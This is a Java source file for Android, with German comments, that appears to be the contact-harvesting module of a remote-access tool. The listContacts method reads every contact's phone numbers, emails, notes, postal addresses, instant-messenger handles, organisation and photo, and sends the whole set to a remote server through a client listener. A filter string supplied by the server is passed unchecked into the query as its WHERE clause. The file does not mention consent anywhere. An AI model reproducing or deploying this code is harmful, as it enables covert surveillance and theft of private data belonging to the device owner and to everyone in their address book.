package my.app.Library;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Bitmap.CompressFormat;
import android.net.Uri;
import android.provider.ContactsContract;

import utils.Contact;

import my.app.client.ClientListener;
import Packet.ContactsPacket;

/**
 * Diese Klasse sammelt alles Informationen über die unterschiedlichen Kontatke, welche auf dem Gerät gespeichert sind.
 */
public class ContactsLister {

	/**
	 * Diese Methode sammelt alle Daten eines Kontaktes und speichert diesen dann in eine ArrayList.
	 * Die ArrayList wird später zu einem Paket gepackt und an den Server geschicht.
 	 * @param c	Der Service der diese Methode aufruft.
	 * @param channel	Kanal zur Datenübertragung
	 * @param args	Filter nachdem die Kontakte gefilter werden sollen
	 * @return true wenn Kontakte vorhanden, false sosnt.
	 */
	public static boolean listContacts(ClientListener c, int channel, byte[] args) {
		/**
		 * ArrayList l	in dieser Liste werden alle Kontakte gespeichert.
		 */
		ArrayList<Contact> l = new ArrayList<Contact>();
		/**
		 * boolean ret 	Hierbei handelt es sich um dern return-Wert. Er wird per default auf false gesetzt.
		 */
		boolean ret = false;
		/**
		 * WHERE_CONDITION	Die übergebenen Argumente dienen dazu die Kontakte nach belieben zu filtern.
		 */
		String WHERE_CONDITION = new String(args);
		/**
		 * ContentResolver cr 	Dieser wird benötigt um an die gewünschten Daten zu kommen.
		 * Daten werden unter Android mit Hilfe von ContentProvidern gespeichert und abgefragt.
		 */
        ContentResolver cr = c.getContentResolver();
		/**
		 * Cursor cur	 Hier werden die Ergebnisse der Abfrage gespeichert.
		 */
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,WHERE_CONDITION, null, " DISPLAY_NAME ");
		/**
		 * Sollte cur mehr Elemente als 0 bestiten so beginnt die Schleife.
		 */
        if (cur.getCount() > 0) {
           while (cur.moveToNext()) {
			   /**
				* Erstellen eines neuen Kontakts zur Speicherung der erhaltenen Daten.
				*/
        	   Contact con = new Contact();
			   /**
				* Die Daten werden aus der Varibalen cur ausgelesen und in den verschiedenen Variablen zwischengespeichert.
				*/
               String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
               long idlong = cur.getLong(cur.getColumnIndex(ContactsContract.Contacts._ID));
               
               int times_contacted = cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.TIMES_CONTACTED));
               long last_time_contacted = cur.getLong(cur.getColumnIndex(ContactsContract.Contacts.LAST_TIME_CONTACTED));
               String disp_name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
               int starred = cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.STARRED));
			   /**
				* Die Zwischengespeicehrten Daten werden dem Kontakt con hinzugefügt.
				*/
               con.setId(idlong);
               con.setLast_time_contacted(last_time_contacted);
               con.setTimes_contacted(times_contacted);
               con.setDisplay_name(disp_name);
               con.setStarred(starred);
              
               /**
				* Um die Telefonnummern abzufragen wird eine andere Tabelle benötigt. Hierzu wird der Kontaktname ausgelesen.
                */
               String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
			   /**
				* Dann wird überprüft ob diesem Namen eine Telefonnummer hinterlegt ist
				*/
               if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
				   /**
					* Ist dies der Fall so wird nun eine neue ArrayList erstellt in der alle Telefonnummern des Kontakt gespeichert werden.
					* Hierfür wird ein neuer Cursor erstellt.
					*/
                   // get the phone number
                   Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
                                          ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?", new String[]{id}, null);
                   ArrayList<String> phones = new ArrayList<String>();
                   while (pCur.moveToNext()) {
                         String phone = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                         phones.add(phone);
                   }
				   /**
					* Der Cursor für die Telefonnummern wird gelöscht und die Liste dem Kontakt con hinzugefügt.
					*/
                   pCur.close();
                   con.setPhones(phones);
				   /**
					* Im nächsten Schritt werden die gespeicherten Email-Adressen ausgelesen.
					* Auch hierfür muss wieder ein neuer cursor erstellt werden.
					*/
                  // get email and type
                  Cursor emailCur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                           											null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                           											new String[]{id}, null);
				   /**
					* Überprüfen ob Email-Adressen vorhanden sind.
					*/
                  if(emailCur.getCount() != 0) {
					  /**
					   * Erstellen einer neuen ArrayListe zur Speicherung der dem Kontakt hinterlegten Email-Adressen.
					   */
                	  ArrayList<String> emails = new ArrayList<String>();
	                   while (emailCur.moveToNext()) {
	                       // This would allow you get several email addresses if the email addresses were stored in an array
	                       String email = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
	                       //String emailType = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
	                       emails.add(email);
	                   }
					  /**
					   * Cursor löschen.
					   */
	                   emailCur.close();
					  /**
					   * Die Liste dem Kontakt hinzufügen.
					   */
	                   con.setEmails(emails);
                  }
				   /**
					* Im folgenden werden die den Kontakten hinterlegent Notizen ausgelesen und gespeichert.
					* Auch hierfür ist wieder ein eigener Cursor von nötien um die gewünschten Daten zu erhalten
					* Die Filter um die Notizen von diesem bestimmten Kontakt zu erhalten werden in der Variable noteWhere gespeichert.
					* Sollte es einen Filter für die Kontakte geben und nur bestimmte harausgesucht werden so werden diese in der Varibalen noteWhereParams gepspeichert.
					*/
                   // Get note.......
                   String noteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                   String[] noteWhereParams = new String[]{id, ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE};
				   /**
					* Mit diesem Aufruf wird der Cursor gemäß den oben erstellten Bedingungen erstellt und die entsprechenden Notizdaten aus der Datenbank entnommen.
					*/
                   Cursor noteCur = cr.query(ContactsContract.Data.CONTENT_URI, null, noteWhere, noteWhereParams, null);
				   /**
					* Hier wird überprüft ob der Cursor leer ist.
					*/
                   if(noteCur.getCount() != 0) {
					   /**
						* Wenn nicht so wird eine neue ArrayListe notes erstellt, in der die Notizen gespeichert werden.
						*/
                	   ArrayList<String> notes = new ArrayList<String>();
	                   if (noteCur.moveToFirst()) {
						   /**
							* Nun wird die Notiz aud dem Cursor extrahiert und zwischen gespeichert.
							*/
	                       String note = noteCur.getString(noteCur.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
						   /**
							* Im Anschluss wird die Notiz der notes-Liste hizugefügt.
							*/
	                       notes.add(note);
	                   }
					   /**
						* Nun wird der Cursor nicht mehr benötigt daher wird er geschlossen und die notes-Liste wird dem Kontakt con hinzugefügt.
						*/
	                   noteCur.close();
	                   con.setNotes(notes);
                   }

				   /**
					* Hier wird nun die Adresse ausgelesen.
					* Die Filter und Where-Bedingungen sind diesselben wie beim Auslesen der Notizen.
					*/
                   //Get Postal Address....
                   String addrWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                   String[] addrWhereParams = new String[]{id, ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE};
				   /**
					* Den Cursor erstellen um die Adresse des richtigen Kontaks auszulesen.
					*/
                   Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI, null, addrWhere, addrWhereParams, null);
				   /**
					* Überprüfen ob der Cursor Daten enthält.
					*/
                   if(addrCur.getCount() != 0) {
					   /**
						* Solange es ein nächtes Objekt gibt den Cursor weitervorsetzen und die Daten auslesen.
						*/
	                   while(addrCur.moveToNext()) {
						   /**
							* Die Adressdaten werden nun in Variablen zwischen gespeichert.
							*/
	                       String street = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
	                       String city = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
	                       String state = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
	                       String postalCode = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
	                       String country = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
	                       int type = addrCur.getInt(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
						   /**
							* Die Variablen werden dem con-Kontakt hinzugefügt
							*/
	                       con.setStreet(street);
	                       con.setCity(city);
	                       con.setRegion(state);
	                       con.setPostalcode(postalCode);
	                       con.setCountry(country);
	                       con.setType_addr(type);
	                   }
					   /**
						* Der Cursor wird gelöscht.
						*/
	                   addrCur.close();
                   }
				   /**
					* Erstellen eines neuen Cursor um die Intstant Messanger Daten auszulesen
					*/
                   // Get Instant Messenger.........
                   String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                   String[] imWhereParams = new String[]{id, ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE};
                   Cursor imCur = cr.query(ContactsContract.Data.CONTENT_URI, null, imWhere, imWhereParams, null);
				   /**
					* Überprüfen ob der Cursor Daten enthält
					*/
                   if(imCur.getCount() != 0) {
					   /**
						* ArrayListe erstellen um die Daten zu speichern.
						*/
                	   ArrayList<String> ims= new ArrayList<String>();
	                   if (imCur.moveToFirst()) {
						   /**
							* Daten in Variable imName zwischenspeichern
							*/
	                       String imName = imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));
	                       //String imType = imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.TYPE));
						   /**
							* Variable der ArrayListe hinzufügen
							*/
						   ims.add(imName);
	                   }
					   /**
						* Cursor löschen und die ArrayListe dem Varibalen con hinzufügen.
						*/
	                   imCur.close();
	                   con.setMessaging(ims);
                   }
				   /**
					* Cursor erstellen um die Organisationsdaten des richtigen Kontakts zu erhalten.
					*/
                   // Get Organizations.........
                   String orgWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                   String[] orgWhereParams = new String[]{id, ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE};
                   Cursor orgCur = cr.query(ContactsContract.Data.CONTENT_URI, null, orgWhere, orgWhereParams, null);
				   /**
					* Überprüfen ob der Cursor Daten enthält.
					*/
                   if(orgCur.getCount() != 0) {
	                   if (orgCur.moveToFirst()) {
						   /**
							* Daten aus dem Cursor auslesen und in Variablen zwischenspeichern.
							*/
	                       String orgName = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
	                       String title = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
						   /**
							* Daten der Variablen con hinzufügen.
							*/
	                       con.setOrganisationName(orgName);
	                       con.setOrganisationStatus(title);
	                   }
					   /**
						* Den Cursor löschen.
						*/
	                   orgCur.close();
                   }
				   /**
					* Hier wird nun abschließend noch das mit dem Kontakt verknüpfte Bild ausgelesen.
					*/
                   //Picture Image
           	    	Uri uri = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, idlong);
	        	    InputStream input = ContactsContract.Contacts.openContactPhotoInputStream(cr, uri);
	        	    if (input != null) {
						/**
						 * Auslesen des Fotos
						 */
	        	        Bitmap pic = BitmapFactory.decodeStream(input);
	        	              	        
	        	        ByteArrayOutputStream bos = new ByteArrayOutputStream();
						/**
						 * In PNG-Datein kompromieren.
						 */
	        	        pic.compress(CompressFormat.PNG, 0 /*ignored for PNG*/, bos);
						/**
						 * In dem Byte-Array bitmapdata speichern
						 */
						byte[] bitmapdata = bos.toByteArray();
						/**
						 * bitmapdata der Vatiablen con hinzufügen.
						 */
	        	        con.setPhoto(bitmapdata);
	        	        //Bitmap bitmap = BitmapFactory.decodeByteArray(bitmapdata , 0, bitmapdata .length);
	        	    }
				   /**
					* Den erstellten Kontakt der ArrayListe l hinzufügen.
					*/
	        	    l.add(con);
               }
               
           }
			/**
			 * Return-Varibale auf ture setzen.
			 */
           ret = true;
      }
      else
		/**
		 * Wenn keine Kontakte vorhanden return Variable auf false setzten.
		 */
    	  ret = false;

		/**
		 * Neues ContactsPacket erstellen und diesem die Liste l übergeben.
		 * Danach wird das Packet an den Server gesendet.
		 */
      c.handleData(channel, new ContactsPacket(l).build());
		/**
		 * Die Variable ret wird zurückgegeben.
		 */
      return ret;
	}
}
